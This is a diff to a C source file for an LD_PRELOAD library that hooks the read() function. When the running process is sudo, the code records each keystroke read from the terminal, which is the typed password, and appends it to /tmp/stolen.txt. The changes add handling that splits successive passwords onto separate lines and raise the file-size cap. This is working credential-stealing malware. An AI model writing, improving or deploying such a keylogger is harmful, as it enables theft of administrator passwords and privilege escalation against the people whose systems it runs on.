@@ -30,7 +30,7 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
-#define MAX_FILE_SIZE 64
+#define MAX_FILE_SIZE 128
 #define MAX_PROCESS_NAME_LEN 256
 
 //pointer to real read func (needs to be PIC)
@@ -43,40 +43,72 @@ long long getfsize(const char *fn) {
     return -1;
   }
   off_t fs = st.st_size;
+  // ret our size as a ll
   return (long long)fs;
 }
 
 int amsudo() {
   char process_name[MAX_PROCESS_NAME_LEN] = { 0 };
+  // open file poiter to /proc/self/comm for reading
   FILE *fp_comm = fopen("/proc/self/comm", "r");
+  // put it in process_name
   fgets(process_name, sizeof(process_name), fp_comm);
+  // strip the ending newline and replace it with a null
+  // to keep char array spec
   process_name[strcspn(process_name, "\n")] = '\0';
   fclose(fp_comm);
+  // ret if it is sudo or not
   return strcmp(process_name, "sudo");
 }
 
 ssize_t read(int fd, void *buf, size_t count) {
   if(original_read == NULL) {
+    // ref our original read funcs dynamic lib
     original_read = dlsym(RTLD_NEXT, "read");
+    // make sure we can actually hook the real read()
     if(original_read == NULL) {
       return -1;
     }
   }
   // check if the current process is sudo
   if(amsudo() == 0) {
-    const char stealfile[] = "/tmp/stolen.txt";
-    // make sure our file isn't overgrown
-    if(getfsize(stealfile) >= MAX_FILE_SIZE) {
+    // make sure our file stays small
+    if(getfsize("/tmp/stolen.txt") >= MAX_FILE_SIZE) {
       return original_read(fd, buf, count);
     }
-    // this helps us isolate the characters from term
-    // only (artifact of sudo src)
+    FILE *stealer = fopen("/tmp/stolen.txt", "a+");
+    // this helps us isolate the characters from term only
     if(count == 1) {
-      FILE *stealer = fopen(stealfile, "a");
-      // we need to cast buf
-      fprintf(stealer, "%.1s", (char *)buf);
-      fclose(stealer);
+      // here we are getting the cooresponding int to our currently
+      // written key and writing it to our keybuf, where can then
+      // pull the single key as a char to run our test.
+      char keybuf[2];
+      snprintf(keybuf, sizeof(keybuf), "%.1s", (char *)buf);
+      // as it turns out, after pass is written, an 0x11 goes into
+      // file, so we can trap that, and use it as a termintaor for
+      // subsequent password entries.
+      if(((char)keybuf[0] == 17) && (getfsize("/tmp/stolen.txt") != 0)) {
+        // we can make sure back to back newlines are not being
+        // written by pointing to the end of the file then pulling
+        // the character one back from EOF, then running a negate
+        // check on it.
+        fseek(stealer, -1, SEEK_END);
+	if(fgetc(stealer) != '\n') {
+          // if the last two checks go through, we can write a
+          // line feed.
+          fprintf(stealer, "\n");
+	}
+      }
+      else {
+        // otherwise we just start writing our keys pressed to the
+        // /tmp/stolen.txt file. We just need to cast buf to a char
+        // pointer, and make sure only a single char is written at
+        // a time.
+	fprintf(stealer, "%.1s", (char *)buf);
+      }
     }
+    fclose(stealer);
   }
+  // or just go back to the original read function
   return original_read(fd, buf, count);
 }
